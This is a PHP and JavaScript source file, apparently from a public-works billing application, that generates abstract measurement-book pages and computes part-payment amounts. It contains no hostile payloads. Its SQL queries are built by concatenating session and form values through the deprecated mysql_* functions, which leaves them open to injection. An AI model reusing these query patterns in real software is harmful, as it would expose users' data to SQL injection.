<?php
//session_start();
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
$msg = ''; $Line = 0;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy);
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
function CheckPageBreak($tablehead,$abstmbno,$table,$page)
{
	$nextpage = $page+1;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>C/o Page No ".$nextpage."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	$Output .=  "<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
	$Output .= "</table>";
	$Output .= "<p  style='page-break-after:always;'></p>";
	$Output .= '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
				<tr style="border:none;"><td align="right" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;</td></tr>
				</table>';
	$Output .= $table;
	$Output .= "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
	$Output .= $tablehead;
	$Output .= "<tr>
					<td colspan='3' align='right' class='labelbold'>B/f from Page No ".$page."/ Abstract MB No ".$abstmbno."</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
					<td align='right' class='labelbold'>HEllo</td>
					<td></td>
				</tr>";
	echo $Output;
}

function UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page,$divid,$fromdate,$todate,$rbn,$IsFinRAB)
{
	$RowCnt = 0;
	$update_pageno_sql = "update measurementbook_temp set abstmbookno = '$abstmbno', abstmbpage = '$page' where sheetid	= '$abstsheetid' AND subdivid = '$subdivid'";
	$update_pageno_query = mysql_query($update_pageno_sql);
	$SelectQuery = "select measurementbookid from measurementbook_temp where sheetid = '$abstsheetid' AND subdivid = '$subdivid'";
	$SelectSql 	 = mysql_query($SelectQuery);
	if($SelectSql == true){
		$RowCnt = mysql_num_rows($SelectSql);
	}
	if($RowCnt == 0){
		$InsertQuery = "insert into measurementbook_temp set measurementbookdate = NOW(), staffid = '".$_SESSION['sid']."', fromdate = '$fromdate', todate = '$todate', sheetid = '$abstsheetid', divid = '$divid', subdivid = '$subdivid', abstmbookno = '$abstmbno', abstmbpage = '$page', part_pay_flag = 'DMY', rbn = '$rbn', active = 1, is_finalbill = '$IsFinRAB', userid = ".$_SESSION['userid'];
		$InsertSql = mysql_query($InsertQuery);
	}
}

$staffid 		= 	$_SESSION['sid'];
$userid 		= 	$_SESSION['userid'];
$rbn    		= 	$_SESSION["rbn"]; 
$abstsheetid    = 	$_SESSION["abstsheetid"];   $abstmbno 	= 	$_SESSION["abs_mbno"];  $abstmbpage  	= 	$_SESSION["abs_page"];	
$fromdate       = 	$_SESSION['fromdate'];      $todate   	= 	$_SESSION['todate'];    $abs_mbno_id 	= 	$_SESSION["abs_mbno_id"];
$paymentpercent = 	$_SESSION["paymentpercent"];
$oldabstmbno 	=	$abstmbno;
$oldabstmbpage 	=	$abstmbpage;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$UsedMBArr[$abstmbno][0] = $abstmbpage;
/*if($_POST["Submit"] == "Submit")
{	

	$max_page_abs 			= 	$_POST['txt_maxpage'];
	$abstmbno 				= 	$_POST['txt_abstmbno'];
	$update_asb_maxpage 	= 	"update mbookallotment set mbpage = '$max_page_abs' WHERE allotmentid	= '$abs_mbno_id' AND sheetid = '$abstsheetid'";
	$update_asb_maxpage_sql = 	mysql_query($update_asb_maxpage);
	$oldmbook_query 		= 	"SELECT * from oldmbook WHERE sheetid = '$abstsheetid'";
	$oldmbook_sql 			= 	mysql_query($oldmbook_query);
	if(mysql_num_rows($oldmbook_sql)>0)
	{
		while($res = mysql_fetch_array($oldmbook_sql))
		{
			$mbno 								= 	$res['mbname'];
			$mbooktype 							= 	$res['mbook_type'];
			$update_mbookallot_query 			= 	"UPDATE mbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND staffid = '$staffid' AND allotmentid = '".$res['old_id']."'";
			$update_mbookallot_sql 	 			= 	mysql_query($update_mbookallot_query);
			$update_aggreement_mbookallot_query = 	"UPDATE agreementmbookallotment set active = '0' WHERE sheetid = '$abstsheetid' AND allotmentid = '".$res['old_id']."'";
			$update_aggreement_mbookallot_sql 	= 	mysql_query($update_aggreement_mbookallot_query); 
			$oldmbook  		   				   .= 	$res['mbname']."*"; 
		} 
	} 
    $currentquantity 			= 	trim($_POST['currentquantity']);
	$mbookquery					=	"INSERT INTO measurementbook  (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks) SELECT  now(), staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbnopages, mbpage, mbremainpage, mbtotalpages, mbquantity, mbtotal, abstmbookno, abstmbpage, abstquantity, absttotal, pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill, remarks FROM measurementbook_temp WHERE sheetid = '$abstsheetid'";// WHERE flag =1 OR flag = 2";
   	$mbooksql 					= 	mysql_query($mbookquery);   
    $sheetquery 				= 	"UPDATE sheet SET rbn = '$runn_acc_bill_no' WHERE sheet_id ='$abstsheetid'";//AND STAFFID
    $sheetsql 					= 	dbQuery($sheetquery);
	$mbookpage_query 			= 	"select distinct mbno from mbookgenerate a WHERE NOT EXISTS(select mbname from oldmbook b WHERE a.mbno = b.mbname AND b.sheetid = '$abstsheetid') AND a.sheetid = '$abstsheetid'";
	$mbookpage_sql 				= 	mysql_query($mbookpage_query);
	while($result3 = mysql_fetch_array($mbookpage_sql))
	{
		$mbno 					= 	$result3['mbno'];
		$selectmaxpage_query 	= "select max(mbpage) from mbookgenerate WHERE sheetid	= '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$selectmaxpage_sql 		= 	mysql_query($selectmaxpage_query);
		$mbookmaxpage 			= 	@mysql_result($selectmaxpage_sql,'mbpage');
		$upademaxpage_query 	= 	"update mbookallotment set mbpage = '$mbookmaxpage' WHERE sheetid = '$abstsheetid' AND mbno ='".$result3['mbno']."'";
		$upademaxpage_sql 		= 	mysql_query($upademaxpage_query);
	}
	$newmbooksql 				= 	"DELETE FROM oldmbook WHERE sheetid = '$abstsheetid'";// DELETE NEW MBOOK TABLE
	$result1 					= 	dbQuery($newmbooksql);
	$mbookgeneratedelsql		= 	"DELETE FROM mbookgenerate WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK GENERATE TABLE
    $result2 					= 	dbQuery($mbookgeneratedelsql);
	$mbooktempdelsql 			= 	"DELETE FROM measurementbook_temp WHERE sheetid ='$abstsheetid'"; //DELETE MBOOK TEMP TABLE
    $result3 					= 	dbQuery($mbooktempdelsql);
	if($is_finalbill == "Y")
	{
		$deactivate_sheet_query = 	"update sheet set active = '0' WHERE sheet_id = '$abstsheetid'";
		$deactivate_sheet_sql 	= 	mysql_query($deactivate_sheet_query);
	}
}*/


// Commented on 29.12.2016 by Prabasingh for Double time stored in mesaurement book table

/*$checkPartpay_sql 	= 	"select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = 	mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql 	= 	"INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query 		= 	mysql_query($insermbook_temp_sql);
}*/


$query 		= 	"SELECT    sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
$sqlquery 	= 	mysql_query($query);
if ($sqlquery == true) 
{
    $List 					= 	mysql_fetch_object($sqlquery);
    $work_name 				= 	$List->work_name; 
	$short_name 			= 	$List->short_name;   
	$tech_sanction 			= 	$List->tech_sanction;  
    $name_contractor 		= 	$List->name_contractor;   
	$ccno 					= 	$List->computer_code_no;  
	$agree_no 				= 	$List->agree_no; 
	$overall_rebate_perc 	= 	$List->rebate_percent; 
	$runn_acc_bill_no 		= 	$rbn;
	$work_order_no 			= 	$List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length1 				= 	strlen($work_name);
 	$start_line1 			= 	ceil($length1/70); 
	$length2 				= 	strlen($agree_no);
	$start_line2 			= 	ceil($length2/27);  
	$LineIncr 				= 	$start_line1 + $start_line2 + 2 + 2; 
}
$Line = $Line + $LineIncr;
//echo $LineIncr;
$select_new_mbook_no_query1 = "select gen_version from mymbook where sheetid = '$abstsheetid' AND rbn = '$rbn' AND mbookorder = '1' AND mtype = 'A' AND  genlevel = 'abstract' and mbno = '$abstmbno'";
$select_new_mbook_no_sql1 = mysql_query($select_new_mbook_no_query1);
if($select_new_mbook_no_sql1 == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql1)>0)
	{
		$NMBList1 = mysql_fetch_object($select_new_mbook_no_sql1);
		$gen_version = $NMBList1->gen_version;
	}
}

/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array();
if($_POST["modal_btn_next_mb"] == " NEXT "){
	$NextMBFlag = 1;
	$TotalNoList 	= $_POST['txt_no']; //print_r($TotalNoList);exit;
	rsort($TotalNoList);
	foreach($TotalNoList as $NoKey => $NoValue){ 
		//$UsedMBArr[$MBStartVal][0] = $NextMBPageList[$MBStartKey];
		$SelectMB 		= $_POST['txt_next_mb'.$NoValue]; 
		$SelectMBPage 	= $_POST['txt_next_mbpage'.$NoValue];
		if($SelectMBPage != ''){
			array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
			array_push($NextMBPageList,$SelectMBPage);
			$UsedMBArr[$SelectMB][0] = $SelectMBPage;
		}
		
	}
	//print_r($UsedMBArr);exit;
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
	<!--<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
	<script language="javascript" type="text/javascript" src="script/validfn.js"></script>-->
	<!--<link rel="stylesheet" href="css/button_style.css"></link>
	<link rel="stylesheet" href="js/jquery-ui.css">
	<script src="js/jquery-1.10.2.js"></script>
	<script src="js/jquery-ui.js"></script>
	<link rel="stylesheet" href="/resources/demos/style.css">
	<link rel="stylesheet" href="Font style/font.css" />
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>-->
	<link rel="stylesheet" href="css/font-awesome.css" />
	<!--<script type='text/javascript' src='js/basic.js'></script>-->
	<!--<script src="dist/sweetalert-dev.js"></script>
	<link rel="stylesheet" href="dist/sweetalert.css">-->
        <script src="js/jquery.js"></script>
        <script src="js/jquery-ui.js"></script>
		<link rel="stylesheet" href="css/chosen.min.css">
   	 	<script src="js/chosen.jquery.min.js"></script>
		<link href="bootstrap-dialog/css/bootstrap-min.css" rel="stylesheet" type="text/css" />
		<script src="bootstrap-dialog/js/bootstrap.min.js"></script> <!---IMP-->
		<link href="bootstrap-dialog/css/bootstrap-dialog.min.css" rel="stylesheet" type="text/css" />
		<script src="bootstrap-dialog/js/bootstrap-dialog.min.js"></script>
<script type="text/javascript" language="javascript">
	function printBook()
	{
		window.print();
	}
	function goBack(obj)
	{
		var urlPath = obj.id;
		var url = urlPath+".php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				return false;
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetails[j+0];
									remarkRbn 		= searchflagdetails[j+1];
									remarkDate 		= searchflagdetails[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
